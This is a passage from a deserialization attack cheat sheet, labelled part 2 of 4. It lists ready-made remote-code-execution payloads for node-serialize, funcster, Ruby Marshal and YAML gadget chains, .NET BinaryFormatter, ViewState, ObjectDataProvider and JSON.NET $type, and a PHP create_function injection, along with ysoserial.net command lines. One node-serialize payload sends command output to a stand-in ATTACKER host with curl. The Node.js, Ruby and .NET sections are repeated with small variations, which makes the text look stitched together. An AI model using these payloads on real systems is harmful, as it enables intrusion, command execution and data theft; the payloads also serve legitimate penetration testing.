# deserialization-test · part 2

> 分段 2/4。完整索引见 `deserialization-test.md`。

## 10. NODE.JS DESERIALIZATION

- **node-serialize**: `unserialize()` with IIFE (Immediately Invoked Function Expression)
  - Payload marker: `_$$ND_FUNC$$_`
  - Add `()` at end to auto-execute:

  ```json
  {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('COMMAND')}()"}
  ```

- **funcster**: `__js_function` property → `constructor.constructor` to access `process`

  ```json
  {"__js_function":"function(){return global.process.mainModule.require('child_process').execSync('id').toString()}"}
  ```

- **cryo**: similar to funcster, serializes JS objects with function support

---
## RUBY DESERIALIZATION

### Marshal (Binary Format)
```ruby
# Ruby's Marshal.load is equivalent to Java's ObjectInputStream
# Any class with marshal_dump/marshal_load can be a gadget

# Detection: binary data starting with \x04\x08
# Or hex: 0408

# PoC gadget (requires vulnerable class in scope):
payload = "\x04\x08..." # hex-encoded gadget chain
Marshal.load(payload)    # triggers arbitrary code execution
```

### YAML.load (Critical — Most Common Ruby Deser Sink)
```ruby
# YAML.load (NOT YAML.safe_load) deserializes arbitrary Ruby objects

# Ruby <= 2.7.2 — Gem::Requirement chain:
# Triggers via !ruby/object constructor
---
!ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
    - !ruby/object:Gem::Source
      current_fetch_uri: !ruby/object:URI::Generic
        path: "| id"

# Ruby 2.x–3.x — Gem::Installer chain:
# Uses Gem::Installer → Gem::StubSpecification → Kernel#system
---
!ruby/hash:Gem::Installer
i: x
!ruby/hash:Gem::SpecFetcher
i: y
!ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
      read: 0
      header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
      socket: &1 !ruby/object:Gem::RequestSet
        sets: !ruby/object:Net::WriteAdapter
          socket: !ruby/module 'Kernel'
          method_id: :system
        git_set: id    # <-- command to execute
      method_id: :resolve

# Safe alternative: YAML.safe_load (whitelist of allowed types)
```

### Tools
- `elttam/ruby-deserialization` — Ruby gadget chain generator
- `frohoff/ysoserial` inspiration → check Ruby-specific forks

---
## .NET DESERIALIZATION

### Traffic Fingerprinting

| Indicator | Serializer |
|---|---|
| Hex `00 01 00 00 00` / Base64 `AAEAAD` | BinaryFormatter |
| Hex `FF 01` / Base64 `/w` | DataContractSerializer |
| ViewState starts with `__VIEWSTATE` | LosFormatter / ObjectStateFormatter |
| JSON with `$type` property | JSON.NET (Newtonsoft) TypeNameHandling |
| XML with `<ObjectDataProvider>` | XmlSerializer / NetDataContractSerializer |

### BinaryFormatter / LosFormatter
```
# Most dangerous — arbitrary type instantiation
# Tool: ysoserial.net

ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "cmd /c whoami > C:\\out.txt" -o base64

# LosFormatter wraps BinaryFormatter — same gadgets work
ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "calc.exe" -o base64
```

### XmlSerializer + ObjectDataProvider
```xml
<root>
  <ObjectDataProvider MethodName="Start" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation">
    <ObjectDataProvider.MethodParameters>
      <sys:String xmlns:sys="clr-namespace:System;assembly=mscorlib">cmd.exe</sys:String>
      <sys:String xmlns:sys="clr-namespace:System;assembly=mscorlib">/c whoami</sys:String>
    </ObjectDataProvider.MethodParameters>
    <ObjectDataProvider.ObjectInstance>
      <ProcessStartInfo xmlns="clr-namespace:System.Diagnostics;assembly=System">
        <ProcessStartInfo.FileName>cmd.exe</ProcessStartInfo.FileName>
        <ProcessStartInfo.Arguments>/c whoami</ProcessStartInfo.Arguments>
      </ProcessStartInfo>
    </ObjectDataProvider.ObjectInstance>
  </ObjectDataProvider>
</root>
```

### JSON.NET with TypeNameHandling
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd.exe", "/c whoami"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  }
}
```
Vulnerable when `TypeNameHandling` is set to `Auto`, `Objects`, `Arrays`, or `All`.

### Tools
- `pwntester/ysoserial.net` — primary .NET deserialization payload generator
- Gadget chains: TypeConfuseDelegate, TextFormattingRunProperties, PSObject, ActivitySurrogateSelectorFromFile

---
## NODE.JS DESERIALIZATION

### node-serialize (IIFE Pattern)
```javascript
// node-serialize uses eval() internally
// Payload uses _$$ND_FUNC$$_ marker + IIFE:

var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\',function(error,stdout,stderr){console.log(stdout)});}()"}';

// The trailing () makes it an Immediately Invoked Function Expression
// When unserialize() processes this, it executes the function

// Full HTTP exploit (in cookie or body):
{"username":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://ATTACKER/?x=$(id|base64)',function(e,o,s){});}()","email":"test@test.com"}
```

### funcster
```javascript
// funcster deserializes functions via constructor.constructor pattern:
{"__js_function":"function(){var net=this.constructor.constructor('return require')()('child_process');return net.execSync('id').toString();}"}
```

### PHP create_function + Deserialization Combo
```php
// When a PHP class uses create_function in __destruct or __wakeup:
// Serialize an object where:
$a = "create_function";
$b = ";}system('id');/*";
// The lambda body becomes: function(){ ;}system('id');/* }
// Closing the original function body and injecting a command

// In serialized form, private properties need \0ClassName\0 prefix:
O:7:"Noteasy":2:{s:19:"\0Noteasy\0method_name";s:15:"create_function";s:14:"\0Noteasy\0args";s:21:";}system('id');/*";}
```

---
## 11. RUBY DESERIALIZATION

### Marshal
```ruby
# Ruby's native serialization. Dangerous when deserializing untrusted data.
# Detection: Binary data starting with \x04\x08

# One-liner gadget verification (hex-encoded payload):
payload = ["040802"].pack("H*")  # Minimal Marshal header
Marshal.load(payload)
```

### YAML (CVE-rich surface)
```ruby
# YAML.load is DANGEROUS — equivalent to eval for Ruby objects
# Safe alternative: YAML.safe_load

# Ruby <= 2.7.2: Gem::Requirement chain
--- !ruby/object:Gem::Requirement
requirements:
  - !ruby/object:Gem::DependencyList
    specs:
    - !ruby/object:Gem::Source
      uri: "| id"

# Ruby 2.x-3.x: Gem::Installer chain (more complex)
# Triggers: git_set → Kernel#system
--- !ruby/object:Gem::Installer
i: x
# (Full chain available in ysoserial-ruby / blind-ruby-deserialization)

# Universal detection: supply YAML that triggers DNS callback
--- !ruby/object:Gem::Fetcher
uri: http://BURP_COLLAB/
```

**Tools**: `elttam/ruby-deserialization`, `mbechler/ysoserial` (Ruby variant)

---
## 12. .NET DESERIALIZATION

### Fingerprinting
| Magic Bytes | Format |
|---|---|
| `AAEAAD` (base64) / `00 01 00 00 00` (hex) | BinaryFormatter |
| `FF 01` or `/w` (base64) | ViewState (ObjectStateFormatter) |
| `<` (XML opening) | XmlSerializer / DataContractSerializer |
| JSON with `$type` key | JSON.NET (TypeNameHandling enabled) |

### BinaryFormatter (most dangerous)
```
# Always dangerous when deserializing untrusted data
# Tool: ysoserial.net
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "whoami" -o base64
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c "calc" -o raw
```

### ViewState (ASP.NET)
```
# If __VIEWSTATE is not MAC-protected (enableViewStateMac=false):
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --validationalg="SHA1" --validationkey="KNOWN_KEY"

# Leak machineKey from web.config (via LFI/backup) → forge ViewState
```

### XmlSerializer + ObjectDataProvider
```xml
<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
      xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <ObjectDataProvider MethodName="Start">
    <ObjectInstance xsi:type="Process">
      <StartInfo>
        <FileName>cmd.exe</FileName>
        <Arguments>/c whoami</Arguments>
      </StartInfo>
    </ObjectInstance>
  </ObjectDataProvider>
</root>
```

### JSON.NET ($type abuse)
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": {
      "$type": "System.Diagnostics.ProcessStartInfo, System",
      "FileName": "cmd.exe",
      "Arguments": "/c whoami"
    }
  }
}
```
Vulnerable when `TypeNameHandling != None` in JSON deserialization settings.

### Tools
- `pwntester/ysoserial.net` — primary .NET gadget chain generator
- `NotSoSecure/Blacklist3r` — decrypt/forge ViewState with known machineKey

---
## 13. NODE.JS DESERIALIZATION

### node-serialize (IIFE injection)
```javascript
// Vulnerable pattern:
var serialize = require('node-serialize');
var obj = serialize.unserialize(userInput);

// Payload: IIFE (Immediately Invoked Function Expression)
// The _$$ND_FUNC$$_ prefix signals a serialized function
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)})}()"}

// Key: the () at the end causes immediate execution upon deserialization
```

### funcster
```javascript
// Vulnerable: funcster.deepDeserialize(userInput)
// Payload uses __js_function to inject via constructor chain:
{"__js_function":"function(){var net=this.constructor.constructor('return this')().process.mainModule.require('child_process');return net.execSync('id').toString()}()"}
```

### PHP create_function + Deserialization Combo
```php
// When create_function is available and object is deserialized:
// Payload creates lambda with injected code:
$a = "create_function";
$b = ";}system('id');/*";
// The lambda body becomes: function anonymous() { ;}system('id');/* }
// Effective: close original body, inject command, comment out rest

// In serialized form (with private property \0ClassName\0):
O:8:"ClassName":2:{s:13:"\0ClassName\0func";s:15:"create_function";s:12:"\0ClassName\0arg";s:18:";}system('id');/*";}
```


---
## 附件：JAVA_GADGET_CHAINS

# Java Gadget Chains & Cross-Language Deserialization Deep Dive
